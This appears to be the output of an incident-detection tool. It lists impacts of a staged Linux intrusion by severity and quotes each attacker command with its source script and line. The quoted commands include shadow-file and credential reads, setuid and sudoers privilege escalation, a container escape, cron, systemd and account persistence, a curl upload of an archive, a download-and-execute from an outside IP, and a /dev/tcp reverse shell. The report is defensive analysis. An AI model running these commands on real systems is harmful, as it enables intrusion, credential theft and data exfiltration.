[x] high   [!] medium   [i] low

Impact
  [x] Privileged access obtained
      A principal was given a privileged role or permission, or a route to root on a host was opened. Treat what it governs as under attacker control until reviewed.
      targets  file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host
      what     SudoersModification: echo "$RULE" >> /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)
               SetuidBit: chmod u+s "$F" (20261022_091000_step03_privesc.sh:4)
               ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)
      basis    SudoersModification, SetuidBit, ContainerEscape
  [x] Credentials exposed
      Secrets, keys, certificates or stored passwords were read. Treat them as known to the attacker.
      targets  file /etc/shadow; file ~/.ssh/id_rsa; file ~/.aws/credentials; file ~/.bash_history; url http://169.254.169.254/latest/meta-data/; hash of deploy; password of app_rw; token fi********9 (24 chars)
      what     ShadowFileRead: sudo cat /etc/shadow > shadow_20261022_090530.txt (20261022_090500_step02_creds.sh:6)
               PrivateKeyRead: cat ~/.ssh/id_rsa (20261022_090500_step02_creds.sh:4)
               CredentialFileRead: cat ~/.aws/credentials (20261022_090500_step02_creds.sh:3)
               ShellHistoryRead: grep -i token ~/.bash_history (20261022_090500_step02_creds.sh:5)
               CloudMetadataAccess: curl -s http://169.254.169.254/latest/meta-data/ > meta_20261022_090040.txt (20261022_090000_step01_recon.sh:9)
               ClusterSecretRead: kubectl get secrets -A -o yaml (20261022_090500_step02_creds.sh:7)
      basis    ShadowFileRead, PrivateKeyRead, CredentialFileRead, ShellHistoryRead, CloudMetadataAccess, ClusterSecretRead, exposed password
  [x] Persistence established
      A way back in was created: a credential, an account, a key, a scheduled job, a service or a start-up entry. Access survives a password reset.
      targets  unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc
      what     ScheduledJobCreation: (crontab -l; echo "$JOB") | crontab - (20261022_091500_step04_persist.sh:3)
               ScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)
               SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)
               SystemdUnitCreation: systemctl enable --now sync.service (20261022_091500_step04_persist.sh:6)
               AccountCreation: useradd -m -s /bin/bash svc (20261022_091500_step04_persist.sh:7)
               AccountCreation: useradd -m -s /bin/bash svc (audit_20261022_093500.jsonl)
               and 2 more in report.json
      basis    ScheduledJobCreation, SystemdUnitCreation, AccountCreation, SshKeyPersistence, ShellProfilePersistence, Persistence tools
  [x] Data collected
      Mail, chat, documents or files were gathered in bulk. Treat their content as disclosed.
      targets  archive out.tgz
      what     ArchiveCreation: tar czf out.tgz dir/ (20261022_092500_step06_stage.sh:3)
               gzip: gzip {} (20261022_092500_step06_stage.sh:7)
      basis    ArchiveCreation, Collection tools
  [x] Data may have left the environment
      A transfer out was run. Confirm what was sent and where.
      targets  url https://files.example.net/up; file out.tgz
      what     FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)
               nc: nc -zv 203.0.113.41 443 (20261022_093000_step07_channel.py:7)
      basis    FileUpload, Exfiltration tools
  [x] Outside hosts contacted
      Files or commands were fetched from, or a channel was opened to, hosts outside the environment. Affected: 198.51.100.7, 203.0.113.40, 203.0.113.41.
      targets  url http://203.0.113.40/s.sh; host 203.0.113.41 ($H)
      what     ShellDownloadAndExecute: sudo bash -c "$(curl -fsSL http://203.0.113.40/s.sh)" (20261022_092500_step06_stage.sh:4)
               ReverseShell: os.system("exec 3<>/dev/tcp/$H/$PORT") (20261022_093000_step07_channel.py:8)
      basis    ShellDownloadAndExecute, ReverseShell
  [x] Movement to other systems
      Tools that reach other systems were run. Hosts beyond this one may be affected.
      what     ssh: ssh ops@198.51.100.7 'cat /etc/hostname' (20261022_092500_step06_stage.sh:6)
      basis    LateralMovement tools
  [x] Defences and logging impaired
      Logs were cleared or security tooling was interfered with. Records of this period are incomplete.
